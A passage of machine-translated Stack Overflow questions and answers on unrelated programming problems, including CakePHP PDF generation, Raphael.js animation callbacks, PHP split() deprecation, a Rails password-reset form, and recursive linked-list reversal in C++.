                 demoname = row["demoname"] != null ? 
                            row["demoname"].ToString() : 
                            String.Empty
             }).ToList<myClass>(); 
```

# cakephp - WKHTMLTOPDF 内部错误

> ID：13061815
> 
> 赞同：4
> 
> 时间：2012-10-25T04:56:14.890
> 
> 标签：cakephp, plugins, wkhtmltopdf

我有一个页面应该在 WKHTMLTOPDF 引擎的帮助下呈现为 pdf。当我单击链接加载页面时，我收到此错误：

```
WKHTMLTOPDF didn&#039;t return any data
Error: An Internal Error Has Occurred. 
```

堆栈跟踪如下：

APP\Plugin\CakePdf\Pdf\CakePdf.php 第 234 行 → WkHtmlToPdfEngine->output()

```
 }
}

$output = $Engine->output(); 
```

APP\Plugin\CakePdf\View\PdfView.php 第 97 行 → CakePdf->output(string)

打印这个

$this->response->download($this->getFilename()); }

```
$this->Blocks->set('content', $this->renderer()->output($content));

return $this->Blocks->get('content'); 
```

然后打印出我想要的页面

CORE\Cake\Controller\Controller.php 第 956 行 → PdfView->render(null, null)

```
null
null 
```

CORE\Cake\Routing\Dispatcher.php 第 193 行 → Controller->render()

```
 }

        if ($render && $controller->autoRender) {
            $response = $controller->render();

        } elseif ($response->body() === null) { 
```

CORE\Cake\Routing\Dispatcher.php 第 161 行 → Dispatcher->_invoke(InvoicesController, CakeRequest, CakeResponse)

```
object(InvoicesController) {
    helpers => array(
        [maximum depth reached]
    )
    uses => array(
        [maximum depth reached]
    )
    paginate => array(
        [maximum depth reached]
    )
    components => array(
        [maximum depth reached]
    )
    name => 'Invoices'
    request => object(CakeRequest) {}
    response => object(CakeResponse) {}
    viewPath => 'Invoices'
    layoutPath => 'pdf'
    viewVars => array(
        [maximum depth reached]
    )
    view => 'view'
    layout => 'adminpdf'
    autoRender => false
    autoLayout => true
    Components => object(ComponentCollection) {}
    viewClass => 'Pdf'
    View => object(PdfView) {}
    ext => '.ctp'
    plugin => null
    cacheAction => false
    passedArgs => array(
        [maximum depth reached]
    )
    scaffold => false
    methods => array(
        [maximum depth reached]
    )
    modelClass => 'Invoice'
    modelKey => 'invoice'
    validationErrors => null
    Toolbar => object(ToolbarComponent) {}
    Session => object(SessionComponent) {}
    Auth => object(AuthComponent) {}
    RequestHandler => object(RequestHandlerComponent) {}
    pdfConfig => array(
        [maximum depth reached]
    )
    Invoice => object(Invoice) {}
    FieldsInvoice => object(FieldsInvoice) {}
    InvoicesItem => object(InvoicesItem) {}
}
object(CakeRequest) {
    params => array(
        [maximum depth reached]
    )
    data => array([maximum depth reached])
    query => array([maximum depth reached])
    url => 'Invoices/view/1.pdf'
    base => '/pra'
    webroot => '/pra/'
    here => '/pra/Invoices/view/1.pdf'
}
object(CakeResponse) {

} 
```

APP\webroot\index.php 第 92 行 → Dispatcher->dispatch(CakeRequest, CakeResponse)

```
object(CakeRequest) {
    params => array(
        [maximum depth reached]
    )
    data => array([maximum depth reached])
    query => array([maximum depth reached])
    url => 'Invoices/view/1.pdf'
    base => '/pra'
    webroot => '/pra/'
    here => '/pra/Invoices/view/1.pdf'
}
object(CakeResponse) {

} 
```

这是我的 bootstrap.php

```
<?php
    CakePlugin::loadAll();  
    CakePlugin::load('DebugKit');
     CakePlugin::load('CakePdf', array('bootstrap' => true, 'routes' => true));
     Configure::write('CakePdf', array(
        'engine' => 'CakePdf.WkHtmlToPdf',
        'download'=>true,
        'binary'=>'C:\\Program Files (x86)\\wkhtmltopdf\\wkhtmltopdf.exe'));

    // Enable the Dispatcher filters for plugin assets, and
    // CacheHelper.
    Configure::write('Dispatcher.filters', array(
    'AssetDispatcher',
    'CacheDispatcher'
    ));

    // Add logging configuration.
    CakeLog::config('debug', array(
    'engine' => 'FileLog',
    'types' => array('notice', 'info', 'debug'),
    'file' => 'debug',
    ));
    CakeLog::config('error', array(
    'engine' => 'FileLog',
    'types' => array('warning', 'error', 'critical', 'alert', 'emergency'),
    'file' => 'error',
    )); 
```

我的控制器中的视图

```
public function view($id = null) {
    $this->set('title_for_layout', 'Invoices');
    $this->set('stylesheet_used', 'homestyle');
    $this->set('image_used', 'eBOXLogoHome.png');
    $this->layout='adminpdf';

    $this->pdfConfig = array('engine' => 'CakePdf.WkHtmlToPdf');

            $this->Invoice->id = $id;
            if (!$this->Invoice->exists()) {
                throw new NotFoundException(__('Invalid invoice'));
            }
            $this->pdfConfig = array(
                'engine'=>'CakePdf.WkHtmlToPdf',
                'orientation' => 'potrait',
                'filename' => 'Invoice_' . $id
            );

            $this->set('invoice', $this->Invoice->read(null, $id));
        //Retrieve Account Id of current User       
        $accountid=$this->Auth->user('account_id');

        //Find all Invoices where $conditions are satisfied
        $invoicedetails=$this->Invoice->find('first', array(
        'conditions' => array('Invoice.id'=>$id)));

        //prints fieldsInvoice details, including invoice and field information
        $invoices=$this->FieldsInvoice->find('all',array(
        'conditions'=>array(
        'invoice_id'=>$id)));

        $itemInvoice=$this->InvoicesItem->find('all',array('conditions'=>array('invoice_id'=>$id)));

        //Set variables
        $this->set('invoicedetails', $invoicedetails);  
        $this->set('invoice', $invoices);   
        $this->set('accountid', $accountid);
        $this->set('itemInvoice', $itemInvoice);

    }

//End of Controller

    } 
```

我的应用控制器

```
class AppController extends Controller {

    public $components = array(
        'DebugKit.Toolbar',
        'Session', 
        'Auth'=>array(
            'loginRedirect'=>array('controller'=>'users', 'action'=>'login'),
            'logoutRedirect'=>array('controller'=>'users', 'action'=>'login'),
            'invoiceRedirect'=>array('controller'=>'invoices', 'action'=>'viewinvoice'),
            'authError'=>"You can't access this page",
            'authorize'=>array('Controller')
        ),
        'RequestHandler'
    ); 
```

路由.php

```
 */
    CakePlugin::routes();
    Router::mapResources(array('Invoices'));
    Router::connect('/', array('controller' => 'pages', 'action' => 'display', 'home'));
/** 
```

这是我想要呈现为 pdf 的视图

```
<div id = "content">
<h2>View Invoice</h2>
                <table id="data">

    <?php

        if($invoicedetails['Invoice']['scheduled']==1)
        {
            $status = 'Scheduled';  
            $fcol = 'Black';
            $bgcol = '#EBD8E8';
            $pay = NULL;
            $dispute = NULL;
        }
        else if($invoicedetails['Invoice']['paid']==1)
        {
            $status = 'Paid';
            $fcol = 'Black';
            $bgcol = '#B9FAEA';
            $pay = NULL;
            $dispute = NULL;
        }
        else if($invoicedetails['Invoice']['sender_id']==$accountid)
        {
            $status = 'Sent';
            $fcol = 'Black';
            $bgcol = '#F8FAC0';
            $pay = NULL;
            $dispute = NULL;
        }
        else if($invoicedetails['Invoice']['receiver_id']==$accountid)
        {
            $status = 'Received';
            $fcol = 'Black';
            $bgcol = '#FAB9B9';
            $pay = $this->Html->link('Pay', array('controller' => 'Invoices','action'=>'pay_admin',$invoicedetails['Invoice']['id'] )) ;
            $dispute = $this->Html->link('Dispute', array('controller' => 'Disputes','action'=>'add_admin',$invoicedetails['Invoice']['id'] ));
        }

    ?>                      
                <tr>
                <th>Sender: </th>
                <td><?php echo $invoicedetails['SenderAccount']['account_name'];?> </td>
                </tr>

                <tr>
                <th>Receiver: </th>
                <td><?php echo $invoicedetails['ReceiverAccount']['account_name'];?> </td>
                </tr>

                <tr>
                <th>Invoice ID: </th>
                <td><?php echo $invoicedetails['Invoice']['id'];?> </td>
                </tr>

                <tr>
                <th>Invoice Date: </th>
                <td><?php echo date('d.m.Y', strtotime($invoicedetails['Invoice']['created'])); ?></td>
                </tr>

                <tr>
                <th>Due Date: </th>
                <td><?php echo date('d.m.Y', strtotime($invoicedetails['Invoice']['expiry_date'])); ?></td>
                </tr>

                <tr>
                <th>Status: </th>
                <td bgcolor='<?php echo $bgcol ?>'><?php echo $status ;?> </td>
                </tr>

                <tr>
                <th>Actions: </th>
                <td><?php echo $pay ?> <?php echo  $dispute ?></td>
                </tr>               

                </table>
                <br>
                <table id="data">
                <tr>
                    <th>Item Name</th>
                    <th>Description</th>
                    <th>Price Per Unit</th>
                    <th>Quantity</th>
                </tr>
                <?php foreach($itemInvoice as $itemInvoices):?>
                <tr>
                <td><?php echo $itemInvoices['Item']['name']; ?></td>
                <td><?php echo $itemInvoices['Item']['description']; ?></td>
                <td>$<?php echo number_format($itemInvoices['Item']['price'], 2, '.', ','); ?></td>
                <td><?php echo $itemInvoices['InvoicesItem']['quantity']; ?></td>
                </tr>
    <?php endforeach; ?>
                </table>

                <br>

                <table id="data">
                <tr>
                    <th>Field Name</th>
                    <th>Entered Value</th>
                </tr>

        <?php foreach($invoice as $invoices):?>
<tr>
<td><?php echo $invoices['Field']['name']; ?> :</td>
<td><?php echo $invoices['FieldsInvoice']['entered_value']; ?></td>
</tr>
    <?php endforeach; ?>

            </table>
            <br><br> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-08-27T22:13:50.310

Windows 上的一个大问题和 CakePdf 使用的 php proc_open 是二进制文件中的空格和[https://github.com/ceeram/CakePdf/blob/master/Pdf/Engine/WkHtmlToPdfEngine.php#L35](https://github.com/ceeram/CakePdf/blob/master/Pdf/Engine/WkHtmlToPdfEngine.php#L35)中的异常只是抛出返回一条通用消息，而不是发生的错误。

在 /WkHtmlToPdfEngine.php#L36 上扩展 content['stderr] 以查看真正的错误：

```
throw new CakeException("WKHTMLTOPDF didn't return any data. Returned Error: ".$content['stderr']); 
```

*简单的解决方案：*

**不管用**

```
'binary'=> 'C:\\Program Files\\wkhtmltopdf\\wkhtmltopdf.exe' 
```

**作品**

```
'binary'=> 'C:\\Progra~1\\wkhtmltopdf\\wkhtmltopdf.exe' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T08:32:12.030

这段代码有两个问题需要解决

1.  是 bootstrap.php 原始文件中的二进制文件：

    配置::write('CakePdf', array('engine' => 'CakePdf.WkHtmlToPdf', 'download'=>true, 'binary'=>'C:\Program Files (x86)\wkhtmltopdf\wkhtmltopdf.exe' ));

新的

```
 Configure::write('CakePdf', array(
    'engine' => 'CakePdf.WkHtmlToPdf',
    'download'=>false,
    'binary'=>'C:\\wkhtmltopdf\\wkhtmltopdf.exe',
    'orientation'=>'portrait')); 
```

1.  在我的发票控制器中，我的肖像一词有拼写错误。

# iphone - 我如何在警报框中显示辅助检查的单元格值

> ID：13061819
> 
> 赞同：0
> 
> 时间：2012-10-25T04:56:59.990
> 
> 标签：iphone, objective-c, ios, xcode

> **可能重复：**
> [如何获取辅助检查单元格值并将其显示在 alertview](https://stackoverflow.com/questions/13052438/how-to-get-accessarychecked-cell-value-and-show-it-on-alertview)
> [how-to-get-accessarychecked-cell-value-and-show-it-on-alertview](https://stackoverflow.com/questions/13053541/how-to-get-accessarychecked-cell-value-and-show-it-on-alertview)

我已创建`UITableView`并已`cell`在`UITableView`accessarychecked 中。我已经实施了一个名为 `-(IBAction) checkBoxClicked`.

我需要的是，我想在 `Alertbox` 单击按钮时显示辅助检查的单元格值，这是我编写的代码：

```
#import "ViewController.h"

@implementation ViewController
@synthesize  cell;
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return 7;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
   cell= [tableView dequeueReusableCellWithIdentifier:@"cell"];

    if (cell == nil)
    {
        cell = [[ UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"cell"];
    }

    cell.textLabel.text = [myarray objectAtIndex:indexPath.row];

    /*
    NSString *imagefile = [[NSBundle mainBundle] pathForResource:@"cellimage" ofType:@"png"];

    UIImage *ui = [[UIImage alloc] initWithContentsOfFile:imagefile];

    cell.imageView.image = ui;*/

    NSString *check = [[NSBundle mainBundle] pathForResource:@"checkbox_not_ticked" ofType:@"png"];

    UIImage *bi = [[UIImage alloc] initWithContentsOfFile:check];

    cell.imageView.image = bi;
    cell.accessoryType = UITableViewCellAccessoryNone;

       return cell; 

    [cell release];
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

     cell = [tableView cellForRowAtIndexPath:indexPath];

    if (cell.accessoryType == UITableViewCellAccessoryNone) {
        cell.accessoryType = UITableViewCellAccessoryCheckmark;

    } else {
        cell.accessoryType = UITableViewCellAccessoryNone;
    }

}
-(IBAction) checkBoxClicked
{
NSArray *array = [[NSArray alloc] initWithArray:[myarray objectAtIndex:cell.accessoryType]:UITableViewCellAccessoryCheckmark];

    if (array.cell.accessoryType == UITableViewCellAccessoryCheckmark)
{

UIAlertView *msg = [[ UIAlertView alloc] initWithTitle:@"selected items are given: " message:array delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil, nil ];

    [msg show ];
    [msg release];
    [myarray release];

    }
}

//-(IBAction)checkBoxClicked{}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Release any cached data, images, etc that aren't in use.
}

#pragma mark - View lifecycle

- (void)viewDidLoad
{
    myarray = [[NSArray alloc] initWithObjects:@"mondey",@"tuesday",
@"wednesday",@"thursday",@"friday",@"saturday",@"sundey", nil];

    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.

}

- (void)viewDidUnload
{
    [myarray release];
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
}

- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];
}

- (void)viewWillDisappear:(BOOL)animated
{
    [super viewWillDisappear:animated];
}

- (void)viewDidDisappear:(BOOL)animated
{
    [super viewDidDisappear:animated];
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // Return YES for supported orientations
    return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
}

@end 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-25T05:09:40.680

Use tag for each button and retrieve the button instance

# animation - Raphaeljs 动画杀死了我的浏览器

> ID：13061826
> 
> 赞同：1
> 
> 时间：2012-10-25T04:57:46.353
> 
> 标签：animation, resources, raphael, transform, cpu

我有这段代码，我使用 20 条路径制作了一个角色并将其放入一个集合中。现在，当我设置动画时，第一个转换运行顺利，第二个动画卡顿，第三个动画没有按预期发生，第四个动画杀死了我的电脑，浏览器挂起，在任务管理器中我可以看到它消耗高达 70% 的 CPU。我怎样才能避免这种情况并释放资源，以便所有动画顺利运行。

*我必须对那个角色执行 10 个简单的 y 轴变换动画。

[JS小提琴](http://jsfiddle.net/rvD4c/2/)

```
window.onload = function(){  
var paper = Raphael(0,0,400,400);

    var character = paper.set();
    paper.setStart();
    var attr = {fill:'red',stroke:'none'};  

    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);
    var shape = paper.rect(100,100,10,20).attr(attr);

    var character = paper.setFinish();
    character.transform("t0,200")

    //1st animation..
    var chartrnsfrm = Raphael.animation({
        transform:'...t0,-48'        
    },1000,"easeout",function(){
        character.animate(chartrnsfrm1.delay(2000))
    });
    character.animate(chartrnsfrm.delay(2000));

    //2nd animation..
    var chartrnsfrm1 = Raphael.animation({
        transform:'...t0,-48'        
    },1000,"easeout",function(){
        character.animate(chartrnsfrm2.delay(2000))
    });

    //3rd animation..
    var chartrnsfrm2 = Raphael.animation({
        transform:'...t0,-48'        
    },1000,"easeout",function(){
        character.animate(chartrnsfrm3.delay(2000))
    });

    //4th animation..
    var chartrnsfrm3 = Raphael.animation({
        transform:'...t0,-48'        
    },1000,"easeout");
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T15:33:31.743

您期望动画中的回调以与实际不同的方式工作。

该变量`character`包含一组路径。Raphaël 目前没有将这些映射到可以同时为所有孩子制作动画的组。这里发生的是每条路径都是单独动画的。实际上，每个此类动画在完成时都会触发回调。这样，对于第一个动画，`chartrnsfrm1`回调被触发 20 次。`chartrnsfrm2`因此，您为整个角色安排了第二个动画20 次。当您到达`chartrnsfrm3`时，您的回调将被触发 20^3 = 8000 次。安排这些动画会杀死您的浏览器。

我所做的是记住最后一个形状，并且仅在调用当前回调的元素 ( `this`) 等于`lastShape`.

```
var lastShape = shape;

//1st animation.. 
var chartrnsfrm = Raphael.animation({
    transform:'...t0,-48'        
},1000,"easeout",function(){
    if (lastShape == this)
        character.animate(chartrnsfrm1.delay(2000))
});
character.animate(chartrnsfrm.delay(2000)); 
```

[你可以在这里](http://jsfiddle.net/rvD4c/14/ "这里")看到整个更新的小提琴，它启用了第四个动画并且它们都运行顺利。

# php - 不推荐使用拆分功能

> ID：13061828
> 
> 赞同：-3
> 
> 时间：2012-10-25T04:58:23.420
> 
> 标签：php, deprecated

我的 php 脚本中有一个已弃用的错误

```
Deprecated: Function split() is deprecated in directory\filename on line 153 
```

这是错误行

```
list($ns, $el) = split( ':', $element, 2); 
```

我该如何解决？我在 PHP5.3 中运行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:16:10.553

自 PHP 5.3.0 起，split 函数已被弃用。强烈建议不要依赖此功能。您可以使用`preg_split`例如`preg_split("/[\s,]+/", "hypertext language, programming")`. 或者您可以使用`array explode ( string $delimiter , string $string [, int $limit ] )`例如

> // 示例 1 $pizza = "piece1piece2piece3piece4piece5piece6";
> 
> $pieces = explode(" ", $pizza);
> 
> 回声 $pieces[0]; // 块 1
> 
> 回声 $pieces[1]; // 块 2
> 
> // 示例 2 $data = "foo:*:1023:1000::/home/foo:/bin/sh";
> 
> list($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(":", $data);
> 
> 回声$用户；// foo 回声 $pass; // *

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:04:42.827

自 PHP 5.3 起，整个 REGEX 扩展已被弃用。使用 PCRE 扩展，它有一个功能`preg_split`，几乎会给你相同的结果。

查看您的代码片段，您实际上并不需要正则表达式来拆分该字符串，这是 PCRE 扩展提供的。

您可以改用该`explode`函数，它也将为您提供相同的结果，而无需解析和标记正则表达式。

# ruby-on-rails - Rails 在控制器级别处理空白参数

> ID：13061834
> 
> 赞同：0
> 
> 时间：2012-10-25T04:58:41.687
> 
> 标签：ruby-on-rails

我有一个用户模型：

```
class User < ActiveRecord::Base
  has_secure_password
  # validation lets users update accounts without entering password
  validates :password, presence: { on: :create }, allow_blank: { on: :update }
  validates :password_confirmation, presence: { if: :password_digest_changed? }
end 
```

我还有一个**password_reset_controller**：

```
def update
  # this is emailed to the user by the create action - not shown
  @user=User.find_by_password_reset_token!(params[:id])

  if @user.update_attributes(params[:user])
    # user is signed in if password and confirmation pass validations
    sign_in @user
    redirect_to root_url, :notice => "Password has been reset."
  else
    flash.now[:error] = "Something went wrong, please try again."
    render :edit
  end
end 
```

你能看出这里的问题吗？用户可以提交一个空白的密码/确认，rails 将让他们登录，因为 User 模型允许在更新时为空白。

这不是安全问题，因为攻击者仍然需要访问用户的电子邮件帐户才能接近此操作，但我的问题是提交 6 个空白字符的用户将被登录，并且他们的密码不会被更改对他们来说，这可能会导致以后的混乱。

所以，我想出了以下解决方案，我想在投入生产之前检查是否有更好的方法：

```
def update
  @user=User.find_by_password_reset_token!(params[:id])

  # if user submits blank password, add an error, and render edit action     
  if params[:user][:password].blank?
    @user.errors.add(:password_digest, "can't be blank.")
    render :edit
  elsif @user.update_attributes(params[:user])
    sign_in @user
    redirect_to root_url, :notice => "Password has been reset."
  else
    flash.now[:error] = "Something went wrong, please try again."
    render :edit
  end
end 
```

我应该检查 nil 和空白吗？是否有任何 Rails 模式或惯用的 ruby​​ 技术来解决这个问题？

[Fwiw，我有`required: true`html 输入，但也想要这个处理的服务器端。]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T05:05:34.637

请试试这个：

我们可以使用 -**现在？**

前任：

```
if !params[:user][:password].present? 
```

# php - A 类的对象随意（不总是）继承 B 类的行为，同时保留自己的行为。可能的？

> ID：13061835
> 
> 赞同：3
> 
> 时间：2012-10-25T04:58:41.830
> 
> 标签：php, oop, class, behavior, traits

所以，我有两节课。我想知道我是否可以拥有两种类型的 A 类对象：

1.  A类普通物品，
2.  **A 类的对象继承了 B 类的行为，同时保留了自己的行为**，

没有创建第三类。

这可能吗？

基本形式的 A 类不具备 B 类的所有特征，因此扩展 B 类不是一种选择。

我正在使用 PHP 顺便说一句。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-10T13:27:23.490

所以，我发现如果你想在不同的类之间（水平地）共享某种行为，这在 PHP 5.4+ 中可以使用特征。

例如，您可以定义一个名为“Driving”的特征，并且各种类型的 Driver Actor 都可以实现它。

实现 trait 的类将继承 trait 的所有属性和方法，即使使用反射，这些属性和方法也会作为类的一部分出现。

[这](http://phpmaster.com/using-traits-in-php-5-4/)是一个有用的链接，可以很好地解释它。

# ruby-on-rails - 在 Rails 中出现此错误：`ActionView::Template::Error (code converter not found (UTF-8 to UTF-16))`

> ID：13061836
> 
> 赞同：2
> 
> 时间：2012-10-25T04:58:45.670
> 
> 标签：ruby-on-rails, utf-8

出于某种原因，我的一个视图中开始出现以下错误，我没有在开发中得到它，而只是在生产中得到它。

这是回溯的片段，有什么想法吗？

```
ActionView::Template::Error (code converter not found (UTF-8 to UTF-16)):
    19:         [title, summary.gsub(/^/, "  "), nil].join("\n\n")
    20:       end
    21:     end.join
    22:     sections = sections.force_encoding('UTF-8').encode('UTF-16', :invalid => :replace).encode('UTF-8') if sections.respond_to?(:force_encoding)
    23: %>
    24: 
    25: <%= raw sections %> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T17:03:59.680

经过一番摆弄后，我根据条件将问题追踪到在我的视图中包含 javascrips，这些条件必须手动列在 rails 配置中才能通过资产管道。

Rails Guides 的相关信息是：

> 如果您有其他清单或单独的样式表和 JavaScript 文件要包含，您可以将它们添加到预编译数组中：
> 
> config.assets.precompile += ['admin.js', 'admin.css', 'swfObject.js']

在`production.rb`

```
# Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)
# config.assets.precompile += %w( search.js ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T10:11:39.723

我刚刚花了 4 个小时试图调试这个完全相同的错误消息。

你在使用无用的宝石吗？

[https://github.com/lostboy/workless](https://github.com/lostboy/workless)

或任何其他类型的DelayedJob::Scaler？

移除这颗宝石修复了一切！

# ios - 我的应用程序和 safari/Facebook 应用程序之间的 Facebook 会话共享

> ID：13061838
> 
> 赞同：1
> 
> 时间：2012-10-25T04:58:46.417
> 
> 标签：ios, facebook, authentication

我使用旧的 Facebook SDK 在我的 iOS 应用程序中包含了 Facebook 登录/注册。当用户单击应用程序弹出窗口中的 Facebook 登录按钮时，会打开并询问用户凭据，但如果用户已经使用 safari/Facebook 应用程序登录到设备上的 Facebook 帐户，我希望我的应用程序自动登录用户。

我从最近 3 天开始搜索这个，但还没有成功

# c++ - 递归反向单链表

> ID：13061840
> 
> 赞同：2
> 
> 时间：2012-10-25T04:58:56.700
> 
> 标签：c++, recursion

我正在尝试编写一个基本函数来反转递归的单链表。我想知道我是否以正确的方法解决了这个问题？也许有人可以给我一些指示。

```
 void reverse(Node*& p) {
  if (!p) return;
  Node* rest = p->next;
  if (!rest) return;
  reverse(rest);
  p->next->next = p;
  p->next = NULL;
  p = rest;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T05:04:36.950

这不是最有效的方法，但要做到这一点，您可以使用“next”指针调用 reverse 方法，直到没有下一个。在那里，设置在上一个旁边。从递归返回后，设置为上一个。有关示例，请参见[此处的递归版本。](http://www.mytechinterviews.com/reverse-a-linked-list)从链接：

```
Node * reverse( Node * ptr , Node * previous)
{
    Node * temp;
    if(ptr->next == NULL) {
        ptr->next = previous;
        previous->next = NULL;
        return ptr;
    } else {
        temp = reverse(ptr->next, ptr);
        ptr->next = previous;
        return temp;
    }
}
reversedHead = reverse(head, NULL); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-03-04T20:09:34.333

这可能会有所帮助

```
List
{
public:

    .....

    void plzReverse()
    {
         Node* node = myReverse(head);
         node->next = NULL;
    }

private:

    Node * myReverse(Node * node)
    {
        if(node->next == NULL)
        {
            head = node;
            return node;
        }
        else
        {
            Node * temp = myReverse(node->next);
            temp ->next = node;
            return node;
        }
     }
} 
```

另一种解决方案可能是：

```
List
{
public:
.....

    void plzReverse()
    {
        Node* node = myReverse(head, head);
        node->next = NULL;
    }

private:

    Node * myReverse(Node * node, Node*& rhead)
    {
        if(node->next == NULL)
        {
            rhead = node;
            return node;
        }
        else
        {
            Node * temp = myReverse(node->next,rhead);
            temp ->next = node;
            return node;
        }
     }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-25T05:56:26.960

这就是你需要的：

```
Node* reverse(Node* p) {
  if (p->next == NULL) {
    return p;
  } else {
    Node* t = reverse(p->next); // Now p->next is reversed, t is the new head.
    p->next->next = p; // p->next is the current tail, so p becomes the new tail.
    p->next = NULL;
    return t;
  }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-25T05:29:35.383

The recursive solution can look quite pretty, even in C++:

```
Node* reverse(Node* pivot, Node* backward = 0) {
  if (pivot == 0)  // We're done
    return backward; 
  // flip the head of pivot from forward to backward
  Node* rest = pivot->next;
  pivot->next = backward;
  // and continue
  return reverse(rest, pivot);
} 
```

Most C++ compilers do tail call optimization so there's no reason to believe this to be less efficient than an iterative solution.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-06-07T15:45:54.183

```
linkedList *reverseMyNextPointer(linkedList *prevNode, linkedList *currNode)
{
    linkedList *tempPtr;
    if(!currNode)
        return prevNode; 
    else
    {
        tempPtr = currNode->next;
        currNode->next = prevNode;
        return reverseMyNext(currNode,tempPtr);
    }
}

head = reverseMyNextPointer(nullptr,head); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-11-30T01:51:49.753

这是将返回值保留为 void 的解决方案。

```
void reverse(Node*& p) {
  if (!p) return;
  Node* rest = p->next;
  if (!rest) {
      rest = p;
      return;
  }
  reverse(rest);
  p->next->next = p;
  p->next = NULL;
  p = rest;
} 
```

# apache-flex - 将数据从 servlet 重定向到弹性页面？

> ID：13061841
> 
> 赞同：0
> 
> 时间：2012-10-25T04:59:02.123
> 
> 标签：apache-flex, servlets

我在 servlet/jsp 页面中有字符串数据类型，我在该页面上有一个提交按钮，我想通过该按钮将页面重定向到 flex 应用程序，以便应用程序打印这些值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T06:09:55.277

用户单击“提交”后，您可以在 url 中附加数据： [http://dest_flex.html?name=StackOverflow&age=20](http://dest_flex.html?name=StackOverflow&age=20) ...

dest_flex.html 是.swf 的主机页面。在 dest_flex.html 中，您可以使用 javascript 获取 url 参数。在 swf 中，您可以像使用 ExternalInterface 一样从 javascript 中获取参数。然后你可以在你的弹性应用程序中显示数据。

# css - 带有标题覆盖的 CSS 框，最佳实践？

> ID：13061848
> 
> 赞同：0
> 
> 时间：2012-10-25T04:59:45.850
> 
> 标签：css

这是一些 html 和 css，你可以看到它的作用：_ （第一个框真的很重要）

[http://jsfiddle.net/rcGsH/2/](http://jsfiddle.net/rcGsH/2/)

问题是要让它与那里的图像一起正常工作，我必须使用一些技巧来让它正常工作，看起来不太好......就像

将 img 向左或向右浮动，因此它并没有真正占用空间..（还有其他方法可以解决这个问题吗？或者我做得很好吗？）

```
.ad img {
height: 175px; width: 175px;
float: left;
} 
```

并在 ad_info div 内的文本周围制作另一个包装 div 并将其设置为 bottom: 175px 以便文本保持在透明部分......还有其他方法吗？

如果有人对这些问题有适当的解决方案或者这些问题很好，请告诉...

或者我有另一个想法，我可以将图像作为 JQuery 的背景图像，（因为图像将来自 php），我很清楚它是如何工作的，但谁能告诉我哪个解决方案更好？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:14:48.580

有很多方法可以做到这一点，你做对了（也许是一些额外的 div），但我认为这就是你正在寻找的：
[盒子，图像和标题](http://buildinternet.com/2009/03/sliding-boxes-and-captions-with-jquery/)
就像一个额外的，他们使用一点点 jquery，动画那些盒子 ;）

# c++ - 编写循环以更改具有不同名称的 int 数组中的值

> ID：13061858
> 
> 赞同：0
> 
> 时间：2012-10-25T05:00:52.347
> 
> 标签：c++, arrays, loops, input

我的标题有点令人困惑，但我正在尝试编写一个循环来更改 81 个具有不同名称的数组中的值。我想用一个值或一个值数组启动数组。这是我的数独求解器代码的一部分，因为我认为我解释得不好。

```
int cell1[], cell2[9], cell3[9],cell4[9]......cell81[9]; // <-- this will make 81 cells with an array that can hold a possible of 9 candidates

cout << "User input: << endl; // lets use ...1.5...14....67..8...24...63.7..1.9.......3.1..9.52...72...8..26....35...4.9...
                              // as an example 
```

假设我将该输入存储到一个字符数组中，并且我将使用一个循环来决定是启动给定值还是“。” 作为一个空值。

对于空值，我希望用 1-9 个值初始化数组。我可以用这段代码轻松做到这一点。

```
